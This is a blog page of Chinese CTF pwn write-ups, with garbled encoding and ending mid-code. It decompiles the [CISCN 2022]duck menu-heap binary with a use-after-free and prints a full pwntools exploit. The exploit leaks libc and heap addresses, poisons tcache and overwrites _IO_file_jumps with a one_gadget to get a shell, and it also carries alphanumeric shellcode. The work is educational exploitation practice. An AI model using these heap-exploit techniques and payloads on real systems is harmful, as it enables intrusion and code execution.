title="[SUCTF 2018 æ‹›æ–°èµ›]unlink"></a>[SUCTF 2018 æ‹›æ–°èµ›]unlink</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258829.png" alt="image-20240516000224972"></p><p><strong>libc-2.23.so</strong></p><h1 id="CISCN-2022-åä¸œåŒ—-duck"><a href="#CISCN-2022-åä¸œåŒ—-duck" class="headerlink" title="[CISCN 2022 åä¸œåŒ—]duck"></a>[CISCN 2022 åä¸œåŒ—]duck</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258830.png" alt="image-20240516122104471"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings libc.so.6 | grep <span class="string">&#x27;GLIBC&#x27;</span></span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258831.png" alt="image-20240516122335908" style="zoom:50%;" /><p>ä¼°æ‘¸æ˜¯2.34</p><h2 id="é™æ€åˆ†æ-1"><a href="#é™æ€åˆ†æ-1" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  ini();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu(a1, a2);</span><br><span class="line">      v3 = read_1();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      a1 = <span class="string">&quot;Invalid choice&quot;</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        add();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        delete();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°æ˜¯ä¸€ä¸ªèœå•å †</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )                   <span class="comment">// max=20</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !qword_4060[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      qword_4060[i] = v2;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Empty!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Idx: &quot;</span>);</span><br><span class="line">  v1 = read_1();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">20</span> &amp;&amp; qword_4060[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="type">void</span> *)qword_4060[v1]);               <span class="comment">// uaf</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Not allow&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Idx: &quot;</span>);</span><br><span class="line">  v1 = read_1();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">20</span> &amp;&amp; qword_4060[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)qword_4060[v1]);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Not allow&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_147A</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Idx: &quot;</span>);</span><br><span class="line">  v1 = read_1();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">20</span> &amp;&amp; qword_4060[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    v2 = read_1();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt; <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      similar_read(qword_4060[v1], v2);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Not allow&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>å‘ç°åªæœ‰ä¸€ä¸ªuafï¼Œå› æ­¤è¦æ‰“åŠ«æŒioæµï¼ˆä¸ç„¶æ²¡æœ‰ç¨‹åºretç‚¹</p><p>ä¹Ÿå¯ä»¥é€šè¿‡environæ¥æ‰“rop</p><p>è¿™é‡Œé€šè¿‡åŠ«æŒ<code>_IO_file_jumps</code>çš„<code>_IO_new_file_overflow</code>æ¥æ‰“çš„</p><p>å› ä¸ºputså‡½æ•°çš„æ—¶å€™ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œå› æ­¤ç›´æ¥åç­‰flag</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258832.png" alt="image-20240516222354249"></p><p>å¯¹putsçš„æ ˆå›æº¯æ˜¯è¿™æ ·çš„</p><p>åœ¨æ­¤ä¹‹å‰è¦å…ˆæ³„éœ²libcåŸºå€å’ŒheapåŸºå€ï¼ˆæ¥åŠ å¯†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span> , arch=<span class="string">&#x27;amd64&#x27;</span> , log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28001</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx: \n&#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx: \n&#x27;</span>,tbs(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx=<span class="built_in">int</span>,content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx: \n&#x27;</span>,tbs(idx))</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size: \n&#x27;</span>,tbs(<span class="built_in">len</span>(content)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Content: \n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add()</span><br><span class="line">add()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">    info(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span> is delete&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1F2CC0</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io_file_jump_addr=libc_base+<span class="number">0x1F4570</span>-<span class="number">0x10</span></span><br><span class="line">leak(<span class="string">&#x27;io_file_finish_addr&#x27;</span>,io_file_jump_addr)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base=u64(r(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line">leak(<span class="string">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xda861 execve(&quot;/bin/sh&quot;, r13, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r13] == NULL || r13 == NULL || r13 is a valid argv</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL || r12 is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xda864 execve(&quot;/bin/sh&quot;, r13, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r13] == NULL || r13 == NULL || r13 is a valid argv</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xda867 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL || rsi is a valid argv</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">onegadget=libc_base+<span class="number">0xda864</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add()</span><br><span class="line"></span><br><span class="line">pal=p64((heap_base&gt;&gt;<span class="number">12</span>) ^ io_file_jump_addr) + p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sla(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Idx: \n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Size: \n&#x27;</span>,<span class="string">b&#x27;16&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Content: \n&#x27;</span>,pal)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">debug()</span><br><span class="line">pal=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(onegadget)</span><br><span class="line">sla(<span class="string">b&#x27;Choice: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Idx: \n&#x27;</span>,<span class="string">b&#x27;15&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Size: \n&#x27;</span>,<span class="string">b&#x27;32&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Content: \n&#x27;</span>,pal)</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h1 id="HDCTF-2023-Makewish"><a href="#HDCTF-2023-Makewish" class="headerlink" title="[HDCTF 2023]Makewish"></a>[HDCTF 2023]Makewish</h1><p>ç¡®ä¿å‘½åçš„pyæ–‡ä»¶ä¸è¦ä¸ºpwn.pyï¼Œä¸ç„¶ä¼šæŠ¥é”™</p><blockquote><p>randå‡½æ•°åœ¨äº§ç”Ÿéšæœºæ•°å‰ï¼Œéœ€è¦ç³»ç»Ÿæä¾›çš„ç”Ÿæˆä¼ªéšæœºæ•°åºåˆ—çš„ç§å­ï¼Œrandæ ¹æ®è¿™ä¸ªç§å­çš„å€¼äº§ç”Ÿä¸€ç³»åˆ—éšæœºæ•°ã€‚<br>å¦‚æœç³»ç»Ÿæä¾›çš„ç§å­æ²¡æœ‰å˜åŒ–ï¼Œæ¯æ¬¡è°ƒç”¨randå‡½æ•°ç”Ÿæˆçš„ä¼ªéšæœºæ•°åºåˆ—éƒ½æ˜¯ä¸€æ ·çš„ã€‚</p><p>æ¯”å¦‚ï¼šé€šå¸¸å¯ä»¥åˆ©ç”¨ç³»ç»Ÿæ—¶é—´æ¥æ”¹å˜ç³»ç»Ÿçš„ç§å­å€¼ï¼Œå³srand(time(NULL))ï¼Œå¯ä»¥ä¸ºrandå‡½æ•°æä¾›ä¸åŒçš„ç§å­å€¼ï¼Œè¿›è€Œäº§ç”Ÿä¸åŒçš„éšæœºæ•°åºåˆ—ã€‚<br>å¦‚æœsrand(1)ï¼Œå› ä¸º1æ˜¯å¸¸æ•°ï¼Œä¸ä¼šå˜ï¼Œæ‰€ä»¥æ¯æ¬¡è°ƒç”¨randå‡½æ•°ç”Ÿæˆçš„ä¼ªéšæœºåºåˆ—éƒ½æ˜¯ä¸€æ ·çš„ã€‚</p></blockquote><p>æŒºæœ‰è¶£çš„ä¸€é“é¢˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v5 = rand() % <span class="number">1000</span> + <span class="number">324</span>;                     <span class="comment">// éšæœºæ•°&lt;1000)+324</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me you name\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hello,&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me key\n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v4, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == v4 )</span><br><span class="line">    <span class="keyword">return</span> vuln();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;failed&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯ä¸ªéšæœºæ•°ï¼Œå¯æƒœè¿™ä¸ªéšæœºæ•°æ˜¯å›ºå®šçš„ï¼ˆä¸€å¼€å§‹è¿˜å¿˜è®°äº† ç„¶åæƒ³äº†å¾ˆä¹…ï¼‰</p><p>ä¸»è¦å°±æ˜¯é€šè¿‡è¯»å…¥bufæ¥è¦†ç›–canaryä½ä½çš„<code>\x00</code>ç„¶åputsæ—¶å°±ä¼šæ³„éœ²canaryï¼Œè™½ç„¶ä¹ä¸€çœ‹canaryçš„ä¸ä¼šæœ‰ä»»ä½•çš„å½±å“ï¼Œå› ä¸ºä»–çš„returnæ²¡æœ‰ä½“ç°æ£€æŸ¥canaryçš„ç¨‹åºï¼Œè€Œvulnä¸­ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬çš„ä¸»è¦çš„æ“ä½œå‡½æ•°ï¼Œé‡Œé¢è°ƒç”¨äº†å¦‚ä¸‹çš„å‡½æ•°ï¼Œå¯¼è‡´äº†canaryä¹Ÿæ˜¯å¿…è¦çš„</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202406191258833.png" alt="image-20240615214729081"></p><p>å› æ­¤è¦çœ‹æ£€æŸ¥canaryæœ€å¥½çš„åŠæ³•è¿˜æ˜¯çœ‹æ±‡ç¼–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">88</span>]; <span 